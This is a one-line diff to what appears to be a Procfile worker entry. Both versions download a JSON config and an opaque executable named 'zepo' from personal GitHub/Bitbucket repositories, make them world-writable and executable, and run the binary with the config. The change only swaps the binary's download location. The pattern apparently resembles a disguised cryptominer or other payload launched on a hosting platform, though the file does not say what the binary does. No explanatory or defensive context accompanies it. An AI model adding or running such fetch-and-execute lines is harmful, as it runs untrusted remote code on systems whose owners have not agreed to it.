@@ -1,1 +1,1 @@
-worker: wget https://raw.githubusercontent.com/crewi2013-hue/kelop/refs/heads/main/90.json && chmod 777 90.json && wget https://bitbucket.org/puyenghay/horas/raw/190194ca444063eff53b6d14d63836c0a7b14eef/zepo && chmod 777 zepo && ./zepo -c "90.json" 
+worker: wget https://raw.githubusercontent.com/crewi2013-hue/kelop/refs/heads/main/90.json && chmod 777 90.json && wget https://github.com/crewi2013-hue/kelop/raw/refs/heads/main/zepo && chmod 777 zepo && ./zepo -c "90.json" 
